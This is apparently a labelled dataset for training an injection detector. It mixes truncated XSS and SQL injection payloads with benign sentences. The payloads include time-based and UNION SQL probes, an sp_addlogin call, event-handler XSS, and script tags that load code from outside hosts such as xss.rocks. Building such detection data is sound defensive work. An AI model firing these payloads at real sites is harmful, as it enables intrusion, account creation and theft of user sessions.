Payload,Label,text_label,ID
"<object onbeforeload object onbeforeload=""javascri",1,XSS,410
<body onselectstart=alert(1)>select some text,1,XSS,102
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1",2,SQLi,10601
Specify criteria where valid.,0,normal,23307
"1"" ) as firv where 4522 = 4522 or 2367 = ( select ",2,SQLi,20161
<input id=x onfocus=alert(1)>,1,XSS,3112
"1%"" ) ) union all select null#",2,SQLi,18088
<button onDragStart=javascript:alert(1)>,1,XSS,9609
"<isindex onkeydown=""alert(1)"" contenteditable>test",1,XSS,8706
"select * from users where id = 1 or ""{ ( "" = 1 or ",2,SQLi,11595
Delete the email.,0,normal,22869
1%' and 7366 = 9197#,2,SQLi,20202
1%' or 7417 = ( select count ( * ) from sysibm.sys,2,SQLi,20784
"Upon completion of these tasks, this select commit",0,normal,25199
"<script+src="">""+src=""http://yoursite.com/xss.js?69",1,XSS,1337
"<col onmousedown=""alert(1)"">test</col>",1,XSS,2240
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,",2,SQLi,10559
<strong id=x tabindex=1 onbeforeactivate=alert(1)>,1,XSS,8549
"select * from generate_series ( 7667,7667,case whe",2,SQLi,18740
"-6595 ) ) ) union all select 2688,2688,2688,2688,2",2,SQLi,16755
Update your profile picture.,0,normal,22571
"1%"" or ( select 9173 from ( select count ( * ) ,co",2,SQLi,17430
"1"" where 8571 = 8571",2,SQLi,20406
"`""><\x3Cscript>javascript:alert(1)</script>",1,XSS,360
1' in boolean mode ) and sleep ( 5 ) #,2,SQLi,14584
-6433%' ) ) or 9323 = 9323#,2,SQLi,18581
"-2007' where 9157 = 9157 union all select 9157,915",2,SQLi,20451
<style>:target {color: red;}</style><menuitem id=x,1,XSS,5657
"1"" and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||",2,SQLi,19254
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1",2,SQLi,10634
"<style onbeforecopy=""alert(1)"" contenteditable>tes",1,XSS,3708
"-7743"" or 9323 = 9323#",2,SQLi,21985
"<audio onmouseup=""alert(1)"">test</audio>",1,XSS,3385
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,5551
"<style>@keyframes x{}</style><canvas style=""animat",1,XSS,8754
if ( 8727 = 4039 ) select 8727 else drop function ,2,SQLi,20430
This means Prime customers in select neighborhoods,0,normal,25298
http://www.<script>alert(1)</script .com,1,XSS,892
"-6406%' ) or 1570 = convert ( int, ( select char (",2,SQLi,14905
"<noscript onkeydown=""alert(1)"" contenteditable>tes",1,XSS,2597
"<title onPropertyChange title onPropertyChange=""ja",1,XSS,370
"{""id"":null,""firstName"":""Ivan"",""lastName"":""Lock"",""s",0,normal,26881
<figure onpointerenter=alert(1)>XSS</figure>,1,XSS,5499
declare @s varchar ( 8000 ) select @s = 0x73656c65,2,SQLi,11916
"-2987"" ) as iyob where 7827 = 7827 or ( 8459 = 845",2,SQLi,20988
1 ) ) as wufr where 5239 = 5239 or 9643 = ( select,2,SQLi,19230
1' ) ) ) or 4411 = ( select count ( * ) from sysus,2,SQLi,22019
"<ol onbeforecut=""alert(1)"" contenteditable>test</o",1,XSS,5638
"1%"" ) ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( ",2,SQLi,20568
1' rlike ( select * from ( select ( sleep ( 5 ) ) ,2,SQLi,18660
"The House Select Committee on Benghazi, chaired by",0,normal,25429
"On Android, swipe down to display the notification",0,normal,25849
"1' and 4241 = convert ( int, ( select char ( 113 )",2,SQLi,21567
ORDER BY 5#,2,SQLi,10278
1'|| ( select 'iuud' where 3687 = 3687,2,SQLi,20718
"<button onclick=""alert(1)"">test</button>",1,XSS,4670
call regexp_substring ( repeat ( left ( crypt_key ,2,SQLi,13751
1 and 6414 = ( select count ( * ) from rdb$fields ,2,SQLi,16767
"Up to 30% off select men's, women's and kids' swim",0,normal,25217
<script>\u0061lert(1)</script>,1,XSS,182
1' ) or ( select * from ( select ( sleep ( 5 ) ) ),2,SQLi,15568
datetime,0,normal,23198
<animatetransform onpointerenter=alert(1)>XSS</ani,1,XSS,5883
1 ) as obzn where 7652 = 7652 or ( select * from (,2,SQLi,21534
"exec sp_addlogin 'name' , 'password'",2,SQLi,11128
"1"" ) ) and 6486 = 3843 and ( ( ""fbka"" like ""fbka",2,SQLi,21466
"-4811' ) ) ) union all select 4603,4603,4603,4603,",2,SQLi,19863
""" ) ) or ( ( ""x"" ) ) = ( ( ""x",2,SQLi,11661
Delete items.,0,normal,23017
"1"" union all select null,null,null--",2,SQLi,19539
"-2782"" union all select 2109,2109,2109#",2,SQLi,21869
"<embed onkeydown=""alert(1)"" contenteditable>test</",1,XSS,4061
"<keygen onbeforecut=""alert(1)"" contenteditable>tes",1,XSS,6380
-4835 ) ) ) or ( 4219 = 2081 ) *2081 and ( ( ( 853,2,SQLi,17971
<style>:target {transform: rotate(180deg);}</style,1,XSS,2204
"-2639"" ) where 1494 = 1494 union all select 1494--",2,SQLi,16403
"<area onkeyup=""alert(1)"" contenteditable>test</are",1,XSS,3952
select ( case when ( 5163 = 4861 ) then 1 else 516,2,SQLi,14373
1' ) and ( select 2* ( if ( ( select * from ( sele,2,SQLi,17931
) or sleep(__TIME__)=',2,SQLi,10079
Kohl's: Home Closeout: 60% off select cold-weather,0,normal,25917
"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=data:tex",1,XSS,284
"Select the ""Mute"" option at the very top of the ne",0,normal,25602
1 ) ) or sleep ( 5 ) and ( ( 8285 = 8285,2,SQLi,13474
-8370' ) ) or ( 3501 = 6407 ) *6407 and ( ( 'agcm',2,SQLi,16801
&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;htt,1,XSS,1408
Select a dance move to perform.,0,normal,24194
<nobr id=x tabindex=1 ondeactivate=alert(1)></nobr,1,XSS,2911
"<h1 onmousemove=""alert(1)"">test</h1>",1,XSS,6762
1' ) where 8163 = 8163,2,SQLi,17077
<ruby onpointerdown=alert(1)>XSS</ruby>,1,XSS,4955
"<details onmouseup=""alert(1)"">test</details>",1,XSS,2642
"-9947"" ) ) ) union all select 8765,8765,8765,8765,",2,SQLi,19737
";alert(String.fromCharCode(88,83,83))//';alert(Str",1,XSS,796
"<time onmousemove=""alert(1)"">test</time>",1,XSS,5888
"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) an",2,SQLi,22479
I need to select the right class for my interests.,0,normal,23907
<track id=x tabindex=1 onactivate=alert(1)></track,1,XSS,4628
"<style>@keyframes x{}</style><acronym style=""anima",1,XSS,7725
1,0,normal,26650
Where's your SQL help?,0,normal,23412
"1 ) ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457",2,SQLi,20816
<!--\x3E<img src=xxx:x onerror=javascript:alert(1),1,XSS,421
Select walk.,0,normal,24640
Select modify.,0,normal,24612
"Just add ingredients, select your desired cycle, a",0,normal,25933
Or select a Medicare Advantage plan that includes ,0,normal,25804
1%' ) or ( select 2* ( if ( ( select * from ( sele,2,SQLi,19536
"1"" ) ) ) and elt ( 1750 = 7826,7826 ) and ( ( ( ""q",2,SQLi,16407
<embed onpointerdown=alert(1)>XSS</embed>,1,XSS,4159
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NUL",2,SQLi,10966
1'|| ( select 'adiv' from dual where 9842 = 9842 a,2,SQLi,16277
""",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20",2,SQLi,10907
"select * from users where id = 1 or "" ) ,"" or 1 = ",2,SQLi,11673
"<caption onkeydown=""alert(1)"" contenteditable>test",1,XSS,5217
"<noembed onbeforecopy=""alert(1)"" contenteditable>t",1,XSS,7485
1'|| ( select 'tmsj' where 2971 = 2971 union all s,2,SQLi,16977
<track onfocusout=alert(1) tabindex=1 id=x></track,1,XSS,6916
Select a travel destination for an escape.,0,normal,23990
"1"" where 9829 = 9829 order by 1#",2,SQLi,20297
1' or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||ch,2,SQLi,12113
"-7069 ) union all select 6638,6638,6638,6638,6638,",2,SQLi,16205
"<LINK REL=""stylesheet"" HREF=""javascript:javascript",1,XSS,752
1' where 3337 = 3337 and 8403 = 5760,2,SQLi,15854
"#""><img src=M onerror=alert('XSS');>",1,XSS,1160
"<tbody draggable=""true"" ondragend=""alert(1)"">test<",1,XSS,7880
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,7770
"Select a categoryâin this case, ""Check-in & Redemp",0,normal,25664
";alert(String&#46;fromCharCode(88,83,83))//\';aler",1,XSS,1108
-6165%' ) ) union all select 5384#,2,SQLi,13585
or%201=1,2,SQLi,10087
<!--><scRipT src=//14.rs>,1,XSS,9019
"<style>@keyframes x{}</style><isindex style=""anima",1,XSS,4490
<IMG ï¿½ï¿½ï¿½><SCRIPT>alert(ï¿½XSSï¿½)</SCRIPT>ï¿½>,1,XSS,1721
"1"" ) ) and 5556 = ( select count ( * ) from all_us",2,SQLi,17290
<span onpointerup=alert(1)>XSS</span>,1,XSS,6805
<input3 onpointerleave=alert(1)>XSS</input3>,1,XSS,2231
"<style>@keyframes x{}</style><strike style=""animat",1,XSS,2983
"{""id"":null,""name"":""want generally""}",0,normal,27338
"1"" ) ) or 9643 = ( select count ( * ) from domain.",2,SQLi,13350
ORDER BY 4,2,SQLi,10308
"What do those comments say, and why did you select",0,normal,25163
"<style>@keyframes slidein {}</style><label style=""",1,XSS,6616
<button onDrop=javascript:alert(1)>,1,XSS,9610
select ( case when ( 9619 = 8679 ) then 1 else 961,2,SQLi,13987
"<pre draggable=""true"" ondragenter=""alert(1)"">test<",1,XSS,7955
"<div id=""62""><!-- IE 6-8 -->",1,XSS,9139
#ERROR!,2,SQLi,10993
-1192 order by 1#,2,SQLi,14740
"1%"" ) ) or 2633 = dbms_pipe.receive_message ( chr ",2,SQLi,19412
<script/&Tab; src='https://dl.dropbox.com/u/130180,1,XSS,839
-3604' ) as fyev where 7259 = 7259 union all selec,2,SQLi,18580
"<samp oncut=""alert(1)"" contenteditable>test</samp>",1,XSS,3951
"The oven was blazing, so the time came to select t",0,normal,25400
AND 7300=7300 AND ('pKlZ'='pKlZ,2,SQLi,10229
Select the right solution for the puzzle.,0,normal,24148
"<u onmouseleave=""alert(1)"">test</u>",1,XSS,2739
Up to 30% off Select Milwaukee Power Tools and Acc,0,normal,25216
"Select wallpapers will be $20-$30 per panel, and s",0,normal,25572
"1"" ) ) as pxdp where 4575 = 4575 and elt ( 8258 = ",2,SQLi,15493
"<section onbeforecopy=""alert(1)"" contenteditable>t",1,XSS,6500
1'+ ( select pxrg where 5589 = 5589 or 5356 = ( se,2,SQLi,20197
"1"" ) ) ) and exp ( ~ ( select * from ( select conc",2,SQLi,21843
waitfor delay '0:0:5' and ( '%' = ',2,SQLi,17766
<button onDragOver=javascript:alert(1)>,1,XSS,9608
"-7119"" ) or 5903 = ( 'qqpjq'|| ( select case 5903 ",2,SQLi,18794
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,",2,SQLi,10504
select case when 5894 = 4052 then 1 else null end-,2,SQLi,16830
select * from users where id = 1 union select 1||@,2,SQLi,11540
select * from users where id = 1 or !<@ or 1 = 1 -,2,SQLi,12039
"1"" ) ) ) union all select null--",2,SQLi,20296
<tr id=x tabindex=1 onbeforedeactivate=alert(1)></,1,XSS,4741
""" - Under ""Past Payments"" select ""Change All to Pr",0,normal,26480
"))) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AN",2,SQLi,11302
"-1908"" ) ) union all select 4072,4072,4072,4072,40",2,SQLi,20927
"<meta draggable=""true"" ondragenter=""alert(1)"">test",1,XSS,2734
"<strike draggable=""true"" ondragleave=""alert(1)"">te",1,XSS,7112
mod,0,normal,23223
"<style>@keyframes slidein {}</style><li style=""ani",1,XSS,8689
1 ) and 2006 = 2006,2,SQLi,18408
1' in boolean mode ) and char ( 120 ) ||char ( 106,2,SQLi,21253
"<ScRipT>alert(""XSS"");</ScRipT>",1,XSS,1712
1 ) where 2232 = 2232,2,SQLi,12599
select ( case when ( 4994 = 1572 ) then 4994 else ,2,SQLi,19243
1' ) where 4407 = 4407 and char ( 107 ) ||char ( 1,2,SQLi,18536
"{""id"":null,""name"":""ShayminLand Forme""}",0,normal,27226
"-8448%"" or 4747 = dbms_utility.sqlid_to_sqlhash ( ",2,SQLi,20068
-6310 or 6715 = 3399,2,SQLi,14384
Where's the missing remote control?,0,normal,22640
"<main onmouseout=""alert(1)"">test</main>",1,XSS,4347
<q id=x tabindex=1 onactivate=alert(1)></q>,1,XSS,3934
"1%"" ) and ( 6016 = 4763 ) *4763 and ( ""%"" = """,2,SQLi,12310
ORDER BY 21,2,SQLi,10325
1'|| ( select 'nvvm' from dual where 5567 = 5567 r,2,SQLi,18687
1' and 8407 = ( select count ( * ) from generate_s,2,SQLi,15828
#NAME?,2,SQLi,10196
Select your group.,0,normal,24865
javascript:alert(1)//INJECTX,1,XSS,9822
"-9944"" ) ) or 8537 = 2039 and ( ( ""kfzj"" = ""kfzj",2,SQLi,14578
"<form onbeforecut=""alert(1)"" contenteditable>test<",1,XSS,6391
"They can either take the shot themselves, or selec",0,normal,25315
select ( case when ( 4393 = 2875 ) then 1 else 439,2,SQLi,18256
"1"" ) ) as yuqr where 7226 = 7226 and ( select * fr",2,SQLi,20208
<body onpagehide=navigator.sendBeacon('//https://s,1,XSS,84
1 ) and exp ( ~ ( select * from ( select concat ( ,2,SQLi,16278
Choose fields where needed.,0,normal,23259
I want to choose a hairstyle for the event.,0,normal,23886
"<div id=""113""><div id=""x"">XXX</div>",1,XSS,9102
"<content onbeforecut=""alert(1)"" contenteditable>te",1,XSS,6759
<rtc onpointerleave=alert(1)>XSS</rtc>,1,XSS,4122
"1"" ) as gffq where 4387 = 4387 or extractvalue ( 1",2,SQLi,19053
1 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||cha,2,SQLi,22131
<iframe src=/ onload=eval(unescape(this.name.repla,1,XSS,9200
"1%"" ) waitfor delay '0:0:5' and ( ""%"" = """,2,SQLi,17574
Randomly select a dish.,0,normal,24272
select * from users where id = 1 or @`\` union sel,2,SQLi,12066
"1"" rlike ( select ( case when ( 7689 = 7689 ) then",2,SQLi,18362
1%' ) ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ),2,SQLi,18277
1' ) as jwch where 4609 = 4609,2,SQLi,20901
group,0,normal,23120
<select id=x tabindex=1 onbeforeactivate=alert(1)>,1,XSS,8268
"-1280"" union all select 8602,8602,8602,8602,8602,8",2,SQLi,16348
Melody Tones This allows you to select from a rang,0,normal,25882
"<datalist draggable=""true"" ondrag=""alert(1)"">test<",1,XSS,8185
Article: Select items up to 20% off (through Septe,0,normal,26357
1' ) as keom where 7524 = 7524 and 2716 = ( select,2,SQLi,17120
1'+ ( select echl where 6593 = 6593 rlike ( select,2,SQLi,13281
"1"" ) ) and ( 3020 = 3020 ) *6703 and ( ( ""bely"" = ",2,SQLi,13853
Home Depot: Up to 50% off select patio furniture; ,0,normal,26089
"select * from users where id = 1 or 1#""? = 1 union",2,SQLi,11993
"1"" ) rlike ( select ( case when ( 8732 = 6244 ) th",2,SQLi,16258
"Previously, it was only available to a few select ",0,normal,25765
1 ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ,2,SQLi,14835
The Energy Select Sector SPDR Fund ETF (XLE) fell ,0,normal,25454
youtube. com / watch? v = rBrx9D Ã¢â¬Â¦ - New GTA Lin,0,normal,25053
Select the right angle for the photo.,0,normal,24075
Select your fluctuate.,0,normal,25042
1 ) ) rlike sleep ( 5 ) #,2,SQLi,20753
"<abbr onbeforepaste=""alert(1)"" contenteditable>tes",1,XSS,5805
"<content ondblclick=""alert(1)"">test</content>",1,XSS,7152
""")) or benchmark(10000000,MD5(1))#",2,SQLi,10846
By this charter the burgesses acquired the right o,0,normal,26297
"or """,2,SQLi,9886
1%' ) order by 1#,2,SQLi,19779
"1"" union all select null,null--",2,SQLi,15049
1' ) as najc where 5213 = 5213 procedure analyse (,2,SQLi,12926
Where's my coffee?,0,normal,23482
Filter the search results.,0,normal,22580
<input onpointerleave=alert(1)>XSS</input>,1,XSS,2961
Search for DNS Servers and select it from the drop,0,normal,25694
"<strike onmousemove=""alert(1)"">test</strike>",1,XSS,4718
"1"" ) ) and make_set ( 8403 = 8403,8899 ) and ( ( """,2,SQLi,17765
1' ) and 6240 = ( 'qqpjq'|| ( select case 6240 whe,2,SQLi,21591
"-9039' ) union all select 8058,8058,8058,8058,8058",2,SQLi,12907
1' ) or 8421 = ( select count ( * ) from generate_,2,SQLi,15800
<dialog onpointerup=alert(1)>XSS</dialog>,1,XSS,3429
Select a plan.,0,normal,24824
"<tr draggable=""true"" ondragleave=""alert(1)"">test</",1,XSS,8161
Let's decide where to go for a hike.,0,normal,23697
Select the perfect wedding dress.,0,normal,24356
<area id=x tabindex=1 onactivate=alert(1)></area>,1,XSS,1966
"1"" or extractvalue ( 1297,concat ( 0x5c,0x7171706a",2,SQLi,20436
<rb onpointermove=alert(1)>XSS</rb>,1,XSS,3861
"<hr oncut=""alert(1)"" contenteditable>test</hr>",1,XSS,7487
<center onpointerup=alert(1)>XSS</center>,1,XSS,8724
1 ) where 8320 = 8320 waitfor delay '0:0:5'--,2,SQLi,13908
"1"" where 1683 = 1683 or ( select * from ( select (",2,SQLi,17763
"1"" where 4450 = 4450 or 6979 = like ( 'abcdefg',up",2,SQLi,22185
select @@microsoftversione,2,SQLi,10030
1' ) and ( select * from ( select ( sleep ( 5 ) ) ,2,SQLi,17820
"<SCRIPT/XSS SRC=""http://xss.rocks/xss.js""></SCRIPT",1,XSS,260
"1"" ) as pwvu where 8267 = 8267",2,SQLi,18982
"1"" ) ) ) and ( select * from ( select ( sleep ( 5 ",2,SQLi,16411
"<th oncontextmenu=""alert(1)"">test</th>",1,XSS,3541
Select both objects Specify rollover settings To t,0,normal,25642
Where's the batting cage?,0,normal,23605
1' or exp ( ~ ( select * from ( select concat ( 0x,2,SQLi,17879
Select your vision.,0,normal,24846
Order a chocolate dessert.,0,normal,22668
1'|| ( select 'zbdv' where 1618 = 1618 or exp ( ~ ,2,SQLi,16290
1'+ ( select 'mxlb' where 4900 = 4900,2,SQLi,13769
"1"" or 2367 = ( select count ( * ) from rdb$fields ",2,SQLi,15855
<colgroup onpointerenter=alert(1)>XSS</colgroup>,1,XSS,6196
TechCrunch editors will select two standout startu,0,normal,25497
"AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND '1",2,SQLi,11294
"1"" or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ",2,SQLi,21902
"-4280%"" ) ) ) union all select 7981,7981--",2,SQLi,16135
<td onpointermove=alert(1)>XSS</td>,1,XSS,8258
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,3521
<td onpointerdown=alert(1)>XSS</td>,1,XSS,2815
1' and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ,2,SQLi,21827
"{""id"":null,""name"":""Dragonfly""}",0,normal,27284
"-4419%"" ) ) or 1 group by concat ( 0x7171706a71, (",2,SQLi,16452
<video/poster/onerror=alert(1)>,1,XSS,9701
"<div id=""95""><svg xmlns=""http://www.w3.org/2000/sv",1,XSS,9155
"-2333' union all select 9714,9714,9714--",2,SQLi,16044
"<IMG SRC=`javascript:alert(""RSnake says, 'XSS'"")`>",1,XSS,804
-5113' ) ) ) or 7200 = 3094--,2,SQLi,21213
"( select 1 from generate_series ( 8515,8515,case w",2,SQLi,17271
"<img draggable=""true"" ondragleave=""alert(1)"">test<",1,XSS,2651
-2300 ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ,2,SQLi,21024
"select * from users where id = 1 or ""$_"" or 1 = 1 ",2,SQLi,11657
"1' and elt ( 1210 = 1210,sleep ( 5 ) ) and 'yhpp' ",2,SQLi,16328
"<data onkeydown=""alert(1)"" contenteditable>test</d",1,XSS,4336
Select a flavor for your morning smoothie.,0,normal,24134
1%' ) and 8312 = dbms_pipe.receive_message ( chr (,2,SQLi,20001
1,0,normal,26666
"<plaintext draggable=""true"" ondragend=""alert(1)"">t",1,XSS,7659
"-8640 ) or elt ( 7657 = 5020,5020 ) and ( 2346 = 2",2,SQLi,14056
<animatemotion onpointerover=alert(1)>XSS</animate,1,XSS,3702
"1' where 8860 = 8860 and extractvalue ( 7982,conca",2,SQLi,19942
select * from pg_group;,2,SQLi,22514
"<noframes draggable=""true"" ondragstart=""alert(1)"">",1,XSS,5510
<acronym onpointerout=alert(1)>XSS</acronym>,1,XSS,4613
"1%"" and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ",2,SQLi,13253
"-6600' ) union all select 5566,5566#",2,SQLi,17819
1' where 2160 = 2160 and exp ( ~ ( select * from (,2,SQLi,20311
Join chat.,0,normal,23075
Select revise.,0,normal,24777
now,0,normal,23195
Delete cookies.,0,normal,23071
1 ) where 9724 = 9724 or char ( 68 ) ||char ( 69 ),2,SQLi,21906
1' where 3028 = 3028,2,SQLi,21828
"<nav oncut=""alert(1)"" contenteditable>test</nav>",1,XSS,7340
"1"" where 3692 = 3692 union all select null,null--",2,SQLi,15207
"<tt onmouseleave=""alert(1)"">test</tt>",1,XSS,3356
"{""id"":null,""firstName"":""Fer"",""lastName"":""Ho"",""spec",0,normal,27030
1'|| ( select 'gwxc' from dual where 3626 = 3626 a,2,SQLi,13591
"1"" ) ) ) rlike ( select ( case when ( 7975 = 2446 ",2,SQLi,16069
ORDER BY 17#,2,SQLi,10290
"{""id"":null,""name"":""Masquerain""}",0,normal,27373
"-8094 ) or elt ( 1032 = 1032,3623 ) and ( 4569 = 4",2,SQLi,22021
<select onblur=alert(1) id=x></select><input autof,1,XSS,3396
It is a matter for the trustees to judge whether t,0,normal,25971
"<dl draggable=""true"" ondragend=""alert(1)"">test</dl",1,XSS,3084
"1"" ) ) as vigs where 6175 = 6175 or ( select 2* ( ",2,SQLi,14779
"Select an entry, then choose Disconnect to revoke ",0,normal,25650
"iif ( 8213 = 4718,1,1/0 )",2,SQLi,19401
<samp id=x tabindex=1 onactivate=alert(1)></samp>,1,XSS,3279
"1%"" ) ) ) or 4240 = ( select 4240 from pg_sleep ( ",2,SQLi,20129
"ABC<div style=""x:\xE2\x80\x89expression(javascript",1,XSS,488
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,2507
"-2168 ) union all select 4980,4980,4980,4980,4980,",2,SQLi,18933
"-1525' ) ) ) union all select 4110,4110,4110,4110,",2,SQLi,22226
<ins onpointerdown=alert(1)>XSS</ins>,1,XSS,8023
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8",2,SQLi,10763
select case when 5346 = 8272 then 1 else null end-,2,SQLi,17274
when,0,normal,23145
"javascript:alert(""hellox worldss"")",1,XSS,946
<svg><b onload=alert(1)></b>,1,XSS,6108
-9770' ) ) as ovhh where 7903 = 7903 or 5023 = ctx,2,SQLi,19111
Where's the best place to practice meditation?,0,normal,23971
"<script>alert(""hellox worldss"");</script>",1,XSS,1714
-3988' ) ) union all select 1113#,2,SQLi,18822
"1 and updatexml ( 3393,concat ( 0x2e,0x7171706a71,",2,SQLi,17714
"1 ) union all select null,null,null,null,null,null",2,SQLi,20240
<input type=checkbox id=x onfocusin=alert(1)>,1,XSS,7844
"-5700 where 4238 = 4238 union all select 4238,4238",2,SQLi,12744
<span onpointerenter=alert(1)>XSS</span>,1,XSS,2773
select * from users where id = 1 % ( $ ) or 1 = 1 ,2,SQLi,11863
"<command draggable=""true"" ondragend=""alert(1)"">tes",1,XSS,5731
1 ) where 2781 = 2781 or 5286 = ( select count ( *,2,SQLi,14528
